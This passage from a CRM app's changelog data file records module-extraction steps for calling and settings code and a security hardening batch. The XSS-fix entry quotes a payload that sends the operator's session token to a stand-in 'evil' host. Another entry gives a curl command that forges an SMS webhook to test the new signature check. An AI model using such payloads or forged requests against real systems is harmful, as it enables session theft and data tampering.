  { date:'2026-05-18', time:'17:00', name:'Build — extract src/calling/inbound.js (step 13c: inbound call lifecycle — invite handling, ringtone, accept/decline)', area:'Build, Calling', description:'THIRD file in src/calling/. Strangler-fig — purely additive ES module duplicating the 8 functions covering the inbound-call lifecycle from index.html ~3893-4235: `enableIncomingCalls` (idempotent best-effort subscriber online registration; silent no-op if SignalWire isn\'t configured, the user lacks calling perm, or the SDK build doesn\'t expose online() on older builds), `handleIncomingInvite` (SDK callback when an invite arrives; dumps raw notification to error_logs for debugging since invites are rare events; probes every plausible field path for caller number/name since SignalWire SDK has shipped multiple shapes over the years; stashes resolved metadata on the invite because some SDK builds clear .details after accept; shows the incoming card + starts ringtone), `showIncomingCallUI` (renders the floating top-center incoming-call card with Accept/Decline buttons; HTML-escapes name + number defensively), `hideIncomingCallUI` (hides the card), `acceptIncomingCall` (permission check with decline-if-denied; stops ringtone + hides card; resolves caller info from stashed metadata or re-derives; sets activeCallContact + activeCallDirection=\'inbound\'; flips in-call UI; awaits invite.accept; attaches audio + teardown listeners; logs inbound message bubble), `declineIncomingCall` (stops ringtone + hides card; calls invite.reject(); logs the call as \'missed\' with logCall), `startRingtone` (WebAudio 480Hz sine, 1s on / 1s off, ~0.15 gain; requires a prior user gesture — the login click counts — before audio can play; ringtone state vars `_ringCtx/_ringOsc/_ringGain/_ringInterval` are intentionally module-local — same names as inline but separate bindings since the start/stop pair is always called within the same code path so the two never need to cross), `stopRingtone` (full cleanup: clear interval, stop + disconnect oscillator + gain, close audio context). Loaded as the 25th ES module via `<script type="module" src="src/calling/inbound.js?v=2026-05-18-6">` after src/calling/outbound.js. Inline copies remain authoritative for every callsite. **One new state-mirror entry:** `pendingInvite` (let, reassignable — SignalWire Call Fabric invite object while the incoming-call UI is on screen; written by handleIncomingInvite, read+cleared by accept + declineIncomingCall). The ringtone state vars are NOT bridged because they\'re private to the start+stop pair and the inline copy + module copy never need to cross. Mirror block is now **50 vars**. ADAPTATIONS from verbatim: state vars via window.* (`swClient`, `incomingCallsRegistered` from 13a; `pendingInvite`, `activeCallContact`, `activeCallDirection`, `swCall`, `conversations`); inline function refs via window.* (`getPrimarySwPhone`, `can`, `logError`, `_safeStringify`, `cleanCallerNumber`, `findContactByPhone` typeof-guarded, `icon`, `requirePerm`, `showToast`, `openDialpad`, `saveConversations`, `logCall`); cross-module refs via window.* (`updateOnlineIndicator` from 13a; `setCallActive` + `attachCallAudio` + `attachCallTeardown` + `endCall` all from 13b — inline still authoritative); module-local refs called bare (`handleIncomingInvite` passed as the handler to swClient.online from enableIncomingCalls; `showIncomingCallUI` + `startRingtone` from handleIncomingInvite; `hideIncomingCallUI` + `stopRingtone` from accept + declineIncomingCall; `declineIncomingCall` from acceptIncomingCall\'s permission-denial path). References inside HTML attribute strings (`acceptIncomingCall`, `declineIncomingCall` inside the showIncomingCallUI markup) are LEFT BARE — resolve via window from the inline hoisted-function declarations because the incoming-call card lives in the global DOM. **VERIFICATION:** `window.__nlmCallingInboundLoaded === true` in DevTools after deploy. A real inbound call still rings + accepts cleanly; subscriber stays online across page reloads; decline path logs the missed call. **ROADMAP:** 13d-e (dialer page + power dialer) next; then 13f (disposition) completes src/calling/.', commit:'5530c35' },
  { date:'2026-05-18', time:'16:30', name:'Build — extract src/calling/outbound.js (step 13b: outbound call lifecycle — attach, start, end, mute, DTMF)', area:'Build, Calling', description:'SECOND file in src/calling/. Strangler-fig — purely additive ES module duplicating the 7 functions covering the outbound-call lifecycle from index.html ~3921-4454: `attachCallAudio` (three-path WebRTC audio attachment — already-available remoteStream, SDK call.on(track), or underlying RTCPeerConnection ontrack; first one wins), `attachCallTeardown` (terminal-state subscriber covering destroy/room.left/call.ended + widened call.state set including the 5 SDK-variant terminal states added defensively after seeing them in the wild), `startCall` (permission check, single-active-call guard, SignalWire connect check via getPrimarySwPhone, in-call UI flip via setCallActive, invocation of dialWithAuthRetry from 13a, attachCallTeardown, in-conversation log entry on success, full reset on failure), `setCallActive` (UI activation: hide idle widget + show active widget + start the seconds-counter interval writing to two timer DOM elements — `#call-active-timer` and `#dp-call-timer`), `endCall` (full teardown with the critical BUG-015 fix: hangup() preferred over leave() because Fabric PSTN dials need the explicit "end this call" verb; ALSO synchronously closes the RTCPeerConnection + detaches the audio element so local media dies instantly even if the SDK round-trip is slow; logs call-history entry; if this was a dialer-queue call, kicks off the disposition prompt via showDialerDisposition which lands in 13f), `toggleMute` (flips callMuted + drives swCall.audioMute/Unmute + updates both mute button DOM elements), `sendDTMF` (sends a single DTMF digit via swCall.sendDigits with error toast on failure; appends to the in-call DTMF display capped at last 16 chars). Loaded as the 24th ES module via `<script type="module" src="src/calling/outbound.js?v=2026-05-18-5">` after src/calling/index.js. Inline copies remain authoritative for every callsite (`onclick="startCall()"` on the green Call button, `onclick="endCall()"` on the red Drop button, the inline dialer flow that calls these as the user clicks queue rows, the mute + keypad buttons in the in-call UI). **Seven new state-mirror entries** added — `swCall` (the active SignalWire Call object), `callTimer` (setInterval ID), `callSeconds` (counter), `callMuted` (bool), `activeCallContact` ({id,name,phone} of the call peer), `activeCallDirection` (\'inbound\'/\'outbound\'), `dialerCallInProgress` (true while a queue-initiated call is live, read by endCall to decide whether to fire the disposition prompt). The mirror block is now **49 vars**. ADAPTATIONS from verbatim: state vars via window.* (the 7 above + `contacts`, `conversations`, `preferredOutputDevice`, `swClient`, `incomingCallsRegistered`); inline function refs via window.* (`requirePerm`, `showToast`, `openModal`, `closeModal`, `navigate`, `getPrimarySwPhone`, `saveConversations`, `openDialpad`, `logCall`, `logError`, `getDialerActiveNumber` typeof-guarded, `fmtPhoneDisplay` typeof-guarded, `showDialerDisposition` typeof-guarded — lands in 13f); cross-module refs via window.* (`dialWithAuthRetry`, `isExpiredTokenError`, `updateOnlineIndicator` from 13a — inline still authoritative so window.* resolves there); inline helper refs via window.* (`_safeStringify` used by the call.state handler in attachCallTeardown); module-local refs called bare (`attachCallTeardown` from startCall; `setCallActive` from startCall; `endCall` from both the teardown lambda in attachCallTeardown AND from startCall\'s catch). References inside HTML attribute strings (`startCall`, `endCall`, `toggleMute`, `sendDTMF`) are LEFT BARE — resolve via window from the inline hoisted-function declarations. **VERIFICATION:** `window.__nlmCallingOutboundLoaded === true` in DevTools after deploy. A real outbound call still works end-to-end — the BUG-015 hangup vs leave path is the most fragile bit, verify Drop ends the call cleanly on the remote PSTN side. **ROADMAP:** 13c (inbound — enableIncomingCalls + showIncomingCall + accept/decline) next; then 13d-e (dialer page + power dialer) and 13f (disposition).', commit:'baa4e7f' },
  { date:'2026-05-18', time:'16:00', name:'Build — start src/calling/ extraction (step 13a: token + client + dial-retry foundation)', area:'Build, Calling', description:'FIRST file in src/calling/. **Calling was deliberately deferred to last** per the saved memory `target-layout-decision` — "calling code is freshly stabilized after BUG-005/006/007 — must not be touched until the module pattern is proven on 5+ other features." By now (2026-05-18) the pattern has shipped across calendar/contacts/pipelines/conversations/clients/settings (6 directories, 22 module files, 100+ extracted functions), so the safety bar has been met and this strangler-fig copy can land. Purely additive infrastructure change — created `CRM file/src/calling/index.js` as the 23rd ES module, exporting the 4 foundation functions from the calling block in index.html ~3795-3884: `initSWClient(force = false)` (token-fetch + SignalWire client construct; if force, tears down the cached client first to avoid socket leak; hits /api/call-token with the operator JWT — the Authorization header requirement from BUG-016 deploy; re-registers the inbound handler on every fresh client), `updateOnlineIndicator()` (tiny DOM helper that flips the green-dot status on the call widget to reflect `incomingCallsRegistered`), `isExpiredTokenError(e)` (single-regex test that catches SignalWire 401/422/auth-expired error shapes including BUG-014\'s "Requester validation failed" — cached subscriber client invalidated mid-session), `dialWithAuthRetry(dialTo)` (wraps swClient.dial() + call.start() with a single retry on expired-token errors; both dial() and start() participate in the SignalWire auth flow so an expired token can surface from either — both must live inside the retry loop). Loaded as the 23rd ES module via `<script type="module" src="src/calling/index.js?v=2026-05-18-4">` after src/settings/usage.js. Inline copies remain authoritative for every callsite (`initSWClient` from the call widget boot path AND from `dialWithAuthRetry` itself, `updateOnlineIndicator` after subscriber online/offline transitions, `isExpiredTokenError` from the retry detector, `dialWithAuthRetry` from `startCall` which is still inline and lands in 13b). DELIBERATELY OUT-OF-SCOPE for this file (next sub-extractions): `startCall` / `endCall` / `attachCallAudio` (13b outbound lifecycle), `enableIncomingCalls` / `showIncomingCall` / `acceptIncoming` / `declineIncoming` (13c inbound), `renderDialerPage` / `dialpad*` / power-dialer queue + autodial (13d-e), call-disposition modal (13f). **Two new state-mirror entries** added: `swClient` (let, reassignable — the SignalWire client singleton; initSWClient writes it to null on force-teardown and to the new client on construct) and `incomingCallsRegistered` (let, reassignable — flipped to true by enableIncomingCalls after a successful client.online({...}), cleared by initSWClient(force=true), read by updateOnlineIndicator). Mirror block is now **42 vars**. **Memory note:** saved `target-layout-decision` says "swClient (SignalWire singleton) lives in exactly one file when calling is extracted. No other module touches the global." That rule kicks in during STEP 14 callsite migration. For now (strangler-fig phase) the inline copy is authoritative and the module\'s window.swClient bridge resolves to the SAME underlying binding via Object.defineProperty getter/setter — so there\'s only one swClient in practice. ADAPTATIONS from verbatim: state vars via window.* (`swClient`, `incomingCallsRegistered`, `authToken`); inline function refs via window.* (`enableIncomingCalls`, `attachCallAudio`, `getDialerActiveNumber`, `logError` — the first three are guarded with typeof === \'function\' checks because they may not be defined when calling code first runs, preserving the inline behavior); module-local refs called bare (`initSWClient` recursive from dialWithAuthRetry on retry, `isExpiredTokenError` used by the retry detector, `updateOnlineIndicator` used by initSWClient when forcing teardown). VERIFICATION: `window.__nlmCallingLoaded === true` in DevTools after deploy. The calling stack still works because inline copies remain authoritative (nothing imports from src/calling/ yet). ROADMAP: 13b-f sub-extractions follow as separate deploys per the same per-file precedent used by pipelines (9a/b/c) and settings (12a/b/c).', commit:'ed1a17c' },
  { date:'2026-05-18', time:'15:30', name:'Build — extract src/settings/usage.js (step 12c: storage stats + version history + audio devices — COMPLETES src/settings/)', area:'Build, Settings', description:'THIRD and FINAL file in src/settings/. Strangler-fig — purely additive ES module duplicating 9 functions across the three "readout" Settings cards: `renderVersionHistory` (reads `window.APP_VERSIONS` set by src/version-history.js; renders the list with commit-hash GitHub links and CURRENT badge); `fmtBytes` (private byte formatter B/KB/MB/GB used across the storage stats functions); `loadStorageStats` (GET /api/storage-stats with the operator JWT — Authorization: Bearer header from BUG-016 deploy; calls renderStorageStats + saveUsageSnapshot on success); `saveUsageSnapshot` (writes a daily snapshot to localStorage `crm-usage-history` on a 90-day rolling window); `renderStorageStats` (headline + stacked bar + per-table breakdown rows + growth stats); `renderUsageRecommendation` (private; usage-tier color-coding, time-to-limit projection in days/weeks/months/years, cleanup suggestion for the biggest table, upgrade hint past 60%); `toggleAudioSettings` (navigate(settings) + delayed enumerateAudioDevices — used by the ⚙ Audio button in the call widget); `enumerateAudioDevices` (populates the input/output `<select>`s with getUserMedia + enumerateDevices output; pre-selects the saved preferred input/output devices); `applyAudioDevice` (onchange handler; persists to localStorage + updates the bridged preferredInput/OutputDevice + applies setSinkId() for output when supported). Loaded as the 22nd ES module via `<script type="module" src="src/settings/usage.js?v=2026-05-18-3">` after src/settings/users.js. Inline copies remain authoritative for every callsite. **Two new state-mirror entries** added: `preferredInputDevice` (let, reassignable — written by applyAudioDevice, read by enumerateAudioDevices for pre-selection) and `preferredOutputDevice` (let, reassignable — written by applyAudioDevice, read by enumerateAudioDevices AND by the inline attachCallAudio at ~3926 which calls setSinkId on the `<audio id="remote-audio">` element for outbound call audio routing). The mirror block is now 40 vars. ADAPTATIONS from verbatim: state vars via window.* (`APP_VERSIONS`, `authToken`, `preferredInputDevice`, `preferredOutputDevice`); inline function refs via window.* (`showToast`, `logError`, `navigate`); module-local refs called bare (`fmtBytes` from loadStorageStats / renderStorageStats / renderUsageRecommendation; `enumerateAudioDevices` from toggleAudioSettings; `renderUsageRecommendation` from renderStorageStats; `renderStorageStats` + `saveUsageSnapshot` from loadStorageStats). References inside HTML attribute strings (`loadStorageStats`, `applyAudioDevice`, `enumerateAudioDevices`) are LEFT BARE because those strings resolve via window from the inline hoisted-function declarations. **VERIFICATION:** `window.__nlmSettingsUsageLoaded === true` in DevTools after deploy; Settings → Data Usage Refresh button still fetches + renders, Version History list still shows entries with GitHub commit links, Audio Devices selects still enumerate + save preferences — all paths use inline copies. **`src/settings/` extraction is now COMPLETE** (12a foundation + 12b users + 12c usage = 30 functions across 3 files, ~600 lines total). The strangler-fig is in place; future callsite migration ("step 14 cleanup") can flip each inline callsite to an import statement and delete the inline copy in tandem. **ROADMAP:** next is `src/calling/` (step 13, deliberately deferred — calling stays stable after BUG-005/006/015 and is the most fragile subsystem to extract).', commit:'61b826d' },
  { date:'2026-05-18', time:'15:00', name:'Build — extract src/settings/users.js (step 12b: team members + per-user permissions)', area:'Build, Settings, Security', description:'SECOND file in src/settings/. Strangler-fig — purely additive ES module duplicating the 8 functions behind the **Team Members** Settings card: `renderUsersList` (row render with role <select> + per-permission toggles, locked for admin rows + non-admin viewers), `changeUserRole` (PATCH `users.role` + reset permissions to role defaults via `rolePermDefaults`), `savePermission` (toggle one perm key on/off, PATCH the merged permissions object), `removeUser` (opens the type-the-name confirmation modal with red theme + warning block), `checkRemoveUserConfirm` (enables/disables the Remove button as the operator types), `executeRemoveUser` (POST /api/delete-user with operator JWT; deletes both auth account + profile row server-side; filters out of `users` array + closes modal), `openInviteUser` (opens the Invite User modal with name/email/password/role fields), `inviteUser` (POST /api/create-user; pushes new user onto `users` array). Loaded as the 21st ES module via `<script type="module" src="src/settings/users.js?v=2026-05-18-2">` after src/settings/index.js. Inline copies remain authoritative for every callsite. **Why split out from 12a:** every code path here is security-sensitive (mutates `users`, calls the JWT-authenticated /api/create-user|/api/delete-user, reads/writes per-user permission booleans). Bundling with the cosmetic 12a foundation block would have made the diff harder to review. The actual auth boundary is the API endpoint JWT check from BUG-016 plus (eventually) per-row RLS rewrites — see [BUG-008](BUGLOG.md). **Three new state-mirror entries** added to the inline block: `users` (let, reassignable — both `users.push(...)` from inviteUser and `users = users.filter(...)` from executeRemoveUser; needs setter), `PERMISSION_DEFS` (const array — module reads to enumerate toggle definitions; getter only), `authToken` (let, reassignable — bridged for the Authorization: Bearer headers on /api/create-user + /api/delete-user; also useful as a foundational bridge for future modules). The mirror block in index.html is now 38 vars. **ADAPTATIONS from verbatim:** state vars via window.* (`users`, `currentUser`, `sb`, `PERMISSION_DEFS`, `authToken`); inline function refs via window.* (`showToast`, `openModal`, `closeModal`, `rolePermDefaults`, `getUserPerms` — the latter two live in the inline PERMISSIONS block at ~2914-2925; they were NOT extracted to `src/shared/permissions.js` despite the filename — that file only contains lightweight helpers); module-local refs called bare (`renderUsersList` from `changeUserRole` / `executeRemoveUser` / `inviteUser` — same-module sibling calls). References inside HTML attribute strings (`savePermission`, `changeUserRole`, `removeUser`, `checkRemoveUserConfirm`, `executeRemoveUser`, `closeModal`, `inviteUser`) are LEFT BARE because those strings are parsed at click/input-time and resolve via window from the inline hoisted-function declarations. **VERIFICATION:** `window.__nlmSettingsUsersLoaded === true` in DevTools after deploy; Settings → Team Members renders rows + toggles, role dropdown PATCHes role + resets permissions, per-toggle click PATCHes one perm, Remove opens type-the-name modal then deletes via /api/delete-user, Invite User modal creates an account via /api/create-user — all paths use inline copies. **ROADMAP:** 12c (usage.js — storage stats + version history + audio devices) is the next and final file in src/settings/; then 13 (calling/) is the deliberately-deferred final extraction.', commit:'8a25d73' },
  { date:'2026-05-18', time:'14:30', name:'Build — start src/settings/ extraction (step 12a: foundation — theme / currency / branding / account / workspace)', area:'Build, Settings', description:'FIRST file in src/settings/. Purely additive infrastructure change — created `CRM file/src/settings/index.js` as the twentieth ES module, exporting the 13 foundation functions from the Settings page block in index.html: branding (handleLogoUpload, applyLogo, removeLogo, handleFaviconUpload, applyFavicon, removeFavicon — 6 fns at ~3097-3174), account (saveAccount at ~7023), workspace (saveWorkspace at ~7037), sidebar refresh (updateSidebarUser at ~7327), appearance (setTheme at ~13546), and the currency module (getCurrencyCode, getCurrencySymbol, formatCurrency, setCurrency + module-local CURRENCIES const at ~13591-13631). Loaded via `<script type="module" src="src/settings/index.js?v=2026-05-18-1"></script>` after src/clients/index.js. The inline copies are intentionally left in place — every existing callsite (the Settings card onclick handlers like `onclick="setCurrency(\'USD\')"`, the doLogin success path that calls updateSidebarUser, the setCurrency re-render fan-out across renderBoard/renderPipelineTabs/renderContacts/renderConversations/renderDashboard) still resolves to the inline functions via window from the hoisted-function declarations. The module is purely additive; nothing imports it yet. NO NEW STATE-MIRROR ENTRIES NEEDED — `currentUser` and `sb` are both already bridged in the 35-var state-mirror block. ADAPTATIONS from verbatim: state vars via window.* (`currentUser`, `sb`); inline function refs via window.* (`showToast`, `renderUsersList`, `renderBoard`, `renderPipelineTabs`, `renderContacts`, `renderConversations`, `renderDashboard`, `renderSettingsPipeline`, `openContactDetail`, `activeContactDetailId`); module-local refs called bare (`applyLogo` from handleLogoUpload, `applyFavicon` from handleFaviconUpload, `updateSidebarUser` from saveAccount, `getCurrencyCode` from getCurrencySymbol, `getCurrencySymbol` from formatCurrency). DELIBERATELY OUT-OF-SCOPE for this file (next two sub-extractions): team members + permissions (renderUsersList, changeUserRole, savePermission, removeUser, checkRemoveUserConfirm, executeRemoveUser, openInviteUser, inviteUser — lands in 12b src/settings/users.js next; security-sensitive so deserves its own focused review), and the readout cards (loadStorageStats, renderStorageStats, saveUsageSnapshot, renderVersionHistory, toggleAudioSettings, enumerateAudioDevices, applyAudioDevice — lands in 12c src/settings/usage.js after users.js). VERIFICATION: `window.__nlmSettingsLoaded === true` in DevTools after deploy; the Settings page (Branding logo/favicon upload + preview + remove, Account name/email save with sidebar refresh, Workspace name save, Appearance theme picker, Currency picker with the instant re-render fan-out across board/pipeline/contacts/conversations/dashboard) should behave identically because the inline copies remain authoritative. ROADMAP: 12b (users.js) is the next file — security-sensitive team-mgmt block; 12c (usage.js) wraps up the Settings extraction; then 13 (calling/) is the deliberately-deferred final extraction.', commit:'63ed507' },
  { date:'2026-05-18', time:'13:30', name:'Security hardening — SignalWire webhook signature verification + rls_auto_enable RPC revoke (BUG-018)', area:'Security, Calling, SMS', description:'**Critical hardening, deploy 3 of 3 in the security batch.** Two unrelated audit findings in one deploy because both touch the SignalWire / Supabase server boundary and neither warranted standalone. (1) **`rls_auto_enable()` Postgres function callable by `anon` via PostgREST RPC.** The function is a Postgres event-trigger handler that auto-enables RLS on newly-created tables in the public schema — designed to run from inside the DDL trigger, never via the API. But because it lives in the `public` schema, PostgREST auto-exposes it at `/rest/v1/rpc/rls_auto_enable` and Supabase\'s default grants made it callable by both `anon` and `authenticated`. Calling it via RPC outside an event-trigger context errors out (pg_event_trigger_ddl_commands() rejects), but the **exposure itself** is what the advisor flagged. Fix: migration `revoke_rls_auto_enable_from_public_api_roles` revokes EXECUTE from PUBLIC, anon, and authenticated. The event trigger continues to run as the function owner (postgres), so new tables still auto-enable RLS — only the public RPC endpoint disappears. (2) **SignalWire webhooks not signature-verified.** `/api/sms-inbound` and `/api/sms-status` accepted any POST without verifying the X-Twilio-Signature header. Before this deploy, anyone who knew the public webhook URLs could forge inbound SMS (writing arbitrary `body` text into `conversations` via the service-role key) or status callbacks (corrupting delivery state on any sent message). Compounded with the XSS class fixed in BUG-017 just an hour ago, the inbound-SMS bug was the highest-severity item in the audit — an attacker could exfil the operator session token without needing to control a real DID. Fix: new `verifySignalWireSignature(req)` in `CRM file/api/_auth.js` implements the standard Twilio-compatible HMAC-SHA1 verification — reconstructs the full webhook URL (proto+host+path+query), concatenates ASCII-sorted POST params (key+value, no separator), HMACs with `process.env.SW_API_TOKEN`, base64-encodes, and `timingSafeEqual` against the X-Twilio-Signature header (or X-SignalWire-Signature for non-compat-API webhooks). Fails closed if SW_API_TOKEN is unset (deployment misconfig should not silently accept unsigned webhooks). Both webhook handlers now reject with 401 before any database work. **Verification:** in production, send a real SMS to the SignalWire number — should still land in conversations and the status callback should still update; from an attacker\'s perspective, `curl -X POST https://mynextlevel-crm.vercel.app/api/sms-inbound -d "From=%2B15555551234&Body=test"` should return 401 with no Supabase write. **What\'s NOT in this deploy** (separate larger work, tracked in BACKLOG): the 10 tables with `USING (true) WITH CHECK (true)` RLS policies (BUG-008 broader fix — real RLS rewrite requires schema decisions about workspace isolation and role-based row access), the `/api/v1/*` shared-static-key endpoints (need per-tenant rotation story), the `vercel.json` CSP header (requires removing `unsafe-inline` which means rewriting every render function to use createElement instead of innerHTML — multi-week refactor), enabling Supabase Auth "Leaked Password Protection" (one-click in dashboard, just needs Aaron to flip it).', commit:'108570f' },
  { date:'2026-05-18', time:'12:30', name:'Security hardening — stored XSS fix in privacy helpers + conversation thread (BUG-017)', area:'Security, UX', description:'**Critical hardening, deploy 2 of 3 in the security batch.** The five privacy helpers shipped with Privacy Mode (`pName` / `pCompany` / `pEmail` / `pPhone` / `pTag` at index.html:2822-2847) never HTML-escaped their input — they returned `${name}` and `<span class="pblur">${rest}</span>` raw. Because every render function (renderContacts, renderDealCard, openContactDetail, renderConvList, dialer queue, etc.) inserts the return value into innerHTML via template literals, a contact whose `name` contained `<img src=x onerror=fetch(\'//evil/?\'+localStorage.nlm_token)>` would execute that script on every list render — exfiltrating the operator\'s Supabase session token from `localStorage.nlm_token`. The conversation thread had the same class of bug in renderConvBubbles (index.html:10828-10830): `msg.subject` and `msg.body` were interpolated raw, and `msg.body` was even passed through `.replace(/\\n/g,\'<br>\')` after which any HTML tags were still live. Worst exposure: an attacker who knows the SignalWire DID can text a payload and have it fire as soon as the operator opens the thread (and `/api/sms-inbound` accepts unsigned webhook POSTs — deploy 3 fixes that). **Fix:** new `escapeHtml(str)` helper near the privacy block (index.html:2822) does the standard 5-char encoding (&amp; &lt; &gt; &quot; &#39;), single regex chain, ~5x faster than the textContent trick because no DOM round-trip. The five privacy helpers were rewritten to escape input BEFORE assembling the `<span class="pblur">` wrapper — so the visible-first-N-chars and the blurred-rest both get escaped, and the wrapper span stays as live HTML. `initials()` at index.html:5028 also now escapes its output (a name like `<svg` would have produced raw `<` in the avatar element). `renderConvBubbles` at index.html:10828 escapes `msg.subject` AND `msg.body` BEFORE the newline→br replacement (escape first; the `<br>` is the only intentional HTML). **NOT touched in this deploy** (rejected as scope creep — separate future passes): attribute-context XSS in onclick handlers (`onclick="openContactDetail(\'${c.id}\')"` patterns at index.html:4972/4974/4983/5405 etc — IDs are UUIDs so low practical risk but worth fixing), `vercel.json` CSP header (would blunt the entire XSS class), and the rest of the render functions audit-flagged as medium risk. **Why this approach over a CSP-only fix:** CSP requires `unsafe-inline` to be removed which would break the entire app (every render function builds HTML via template literals + innerHTML). Proper CSP requires a refactor to either build DOM via `document.createElement` or use template tags with parsed insertion — that\'s a separate multi-week project. Escaping at the helper layer is the pragmatic now-fix. **Verification:** in DevTools console after deploy, run `document.querySelector(\'.td-name span\').innerHTML` on a contact whose name contains an `<` and confirm it shows as `&lt;` not the live tag.', commit:'e6daeeb' },
  { date:'2026-05-18', time:'11:30', name:'Security hardening — lock down cost-bearing API endpoints behind Supabase JWT auth + CORS allowlist', area:'Security, API', description:'**Critical hardening** following the security audit on 2026-05-18. Before this change, five serverless API routes were open to the public internet with `Access-Control-Allow-Origin: *` and no authentication — `/api/sms`, `/api/call-token`, `/api/ai`, `/api/storage-stats`, and `/api/log-error`. The first three were toll-fraud / cost-burn cliffs (a single curl loop from anywhere could send unlimited SMS via SignalWire, mint unlimited 8-hour Call Fabric tokens for outbound PSTN calls, and proxy free Gemini LLM traffic on Aaron\'s account); `/api/storage-stats` leaked row counts + growth rates and amplified ~27 HEAD requests to Supabase per call using the service-role key; `/api/log-error` accepted unbounded writes into `error_logs` using the service-role key, bypassing RLS. **New `CRM file/api/_auth.js` shared helper** exposes `requireAuth(req, res)` and `applyCors(req, res)`. `requireAuth` reads `Authorization: Bearer <JWT>`, decodes the payload, rejects anything where `role !== \'authenticated\'` (so the public anon key — which would otherwise pass Supabase\'s `/auth/v1/user` endpoint — is blocked), checks the `exp` claim locally, and then round-trips to Supabase to confirm the token has not been revoked by sign-out / password change. On any failure it sends a 401 itself; callers do `const user = await requireAuth(req, res); if (!user) return;`. `applyCors` writes `Access-Control-Allow-Origin` only when the Origin header is in the allowlist (production `mynextlevel-crm.vercel.app`, any `*.vercel.app` preview deploy, `localhost`/`127.0.0.1` for dev, plus anything in the optional `ALLOWED_ORIGINS` env var). Unknown origins get no CORS header at all, blocking browser-driven cross-origin abuse. **Four endpoints now require a valid user JWT:** `/api/sms`, `/api/call-token`, `/api/ai`, `/api/storage-stats`. Each picks up `_auth.js` with a one-line require + two-line guard near the top of the handler; no other logic changed. **`/api/log-error` intentionally stays unauthenticated** because errors can fire before login (including failures inside the auth flow itself), and we want those captured. Instead it gets: (a) CORS allowlist, (b) 16 KB request body cap, (c) 4 KB per-field length cap, (d) field whitelist + JSON-stringify on `context` so a non-string payload can\'t bypass the length cap, (e) best-effort in-memory per-IP rate limit at 30/minute (defeated by Vercel cold starts but catches dumb spammers; the size cap is the real shield). **Client (`index.html`) updated at 5 fetch callsites** to send `Authorization: Bearer ${authToken}` — `initSWClient` (call-token), Settings → Storage Stats card, the SMS panel send button, the conversations-page SMS sender, and `callAI` (Gemini). `authToken` is the let var at the top of the inline script that holds the user JWT after login (and the anon key before login — pre-login calls now correctly 401 instead of silently succeeding). **What\'s NOT in this deploy** (next two security deploys per the planned split): stored XSS in the conversation thread and contact/deal name renders (`pName`/`pCompany`/`pEmail`/`pTag` don\'t HTML-escape — an inbound SMS containing `<img src=x onerror=...>` exfils the operator\'s `localStorage.nlm_token`), the `rls_auto_enable()` Postgres function callable by anon, and SignalWire webhook signature verification. Tracking in BUGLOG → BUG-016 + the broader BUG-008 follow-up.', commit:'b6f1880' },
  { date:'2026-05-18', time:'10:00', name:'Privacy Mode — now covers the Pipelines page (deal cards + deal-detail modal)', area:'Pipelines, UX, Privacy', description:'Extended the existing 🔒 Privacy toggle to the Pipelines kanban and the Deal Detail modal. Before this change, turning Privacy On blurred PII on the Contacts list, Contact Detail drawer, Dialer, and Conversations surfaces but left the Pipelines board fully clear — deal names (often the contact\'s name when added via the Contact Detail "Add to Pipeline" flow), company names, the linked-contact badge on each deal card, and the linked-contact email/phone in the Deal Detail modal were all visible during screen shares. Now those display surfaces route through the existing pName/pCompany/pEmail/pPhone/pTag helpers (same CSS-only blur, same first-N-chars-visible behavior — name shows first word, company shows first 3 chars, email shows first 4 chars, phone shows area code, tags fully blurred). Two surfaces touched: renderDealCard (the kanban card — deal.name, deal.company, linkedContact.name in the contact badge, tag labels) and openDealDetail (the modal — title "Deal: X", linked contact name/email/phone in the accent-color summary card, the display tag chips above the tag editor). DELIBERATELY UNTOUCHED: the editable form input value attributes inside the modal (Deal Name, Company, Value, the tag input). Privacy is for casual viewing (screen shares, public spaces) — when a user is actively editing a deal they need to see the real values, and the blurred title + blurred contact card give enough signal that Privacy is on. Also wired renderBoard() into togglePrivacyMode() so flipping the toggle while the Pipelines page is open re-renders the kanban immediately (was already re-rendering Contacts/Dialer/Conversations on toggle but missed the board). Mirrored the same edits into src/pipelines/board.js (renderDealCard) and src/pipelines/admin.js (openDealDetail) so the strangler-fig copies stay aligned with the inline authoritative versions. No DB schema change, no new functions, no new state. Uses window.pName/pCompany/pEmail/pPhone/pTag in the modules (already available — function declarations in the inline script are global, and src/clients/index.js already calls them the same way).', commit:'2ded85e' },
  { date:'2026-05-17', time:'18:00', name:'Lead / Client toggle — visual picker only, save via existing Save Changes button', area:'Contacts, Clients, UX', description:'Changed the Lead / Client toggle from instant-save behavior to a visual picker that defers persistence to the existing Save Changes button at the bottom of the Contact Detail drawer. Previously a click on either button immediately PATCHed `contacts.status` to Supabase and re-rendered the drawer, which felt jarring (the page-wide re-render was visible) and prevented batching the toggle with other unsaved field edits. New behavior: clicking Lead/Client only updates the **status dropdown\'s** value, swaps the button highlight colors, and shows/hides the Client Details card (deposit / payment / VA). Nothing persists until Save Changes is clicked, at which point the unchanged saveContactDetail() reads the status dropdown + client fields in one PATCH. **Client Details card is now always rendered in the DOM** with `display:none/block` controlled by the toggle, so users can fill in deposit/payment/VA before saving without needing a separate round-trip. **In-session memory preserved:** picking Client → Lead within the same drawer session still restores the prior new/active/hot/cold via `window._prevLeadStatus[contactId]`. **Removed the async setClientCategory() function** (no longer needed — was PATCH-on-click). Replaced with synchronous DOM-only pickClientCategory(). Mirrored in src/clients/index.js — module exports pickClientCategory (the old async export is dropped). Strangler-fig still in effect; inline copy authoritative. Tooltip on each button updated to clarify "not saved until you click Save Changes" so the behavior is discoverable.', commit:'dc56da3' },
  { date:'2026-05-17', time:'17:30', name:'Lead / Client toggle on Contact Detail drawer', area:'Contacts, Clients, UX', description:'Added a two-button **Lead / Client** segmented toggle at the top of the Contact Detail drawer\'s Info tab — companion to yesterday\'s Active Clients page. Clicking **Client** sets the contact\'s status to `done` (the existing "Client" status) and makes them appear on the Active Clients page; clicking **Lead** restores the previous non-client sub-status (new / active / hot / cold) using an in-memory recall map keyed by contact id, defaulting to `new` if no prior status was recorded this session. The toggle saves immediately on click (separate from the Save Changes button below — those still cover the rest of the form fields). The existing 5-status dropdown is preserved unchanged underneath, so the granular new/active/hot/cold distinctions stay available for filtering, dispositions, and the Contacts page status column. Two visual states: Lead is highlighted in the accent color, Client in green, with the inactive option ghosted as a secondary label. **Implementation:** new `setClientCategory(contactId, category)` function at index.html ~4350 handles the toggle (single PATCH to `public.contacts.status` + `last_activity`); the toggle HTML lives at the top of the `tab==="info"` body in `openContactDetail` (index.html ~5340). In-session recall lives in `window._prevLeadStatus[contactId]` — a refresh loses the memory and the next Lead toggle defaults to `new`, which is acceptable for the simplest possible UX. Mirrored in 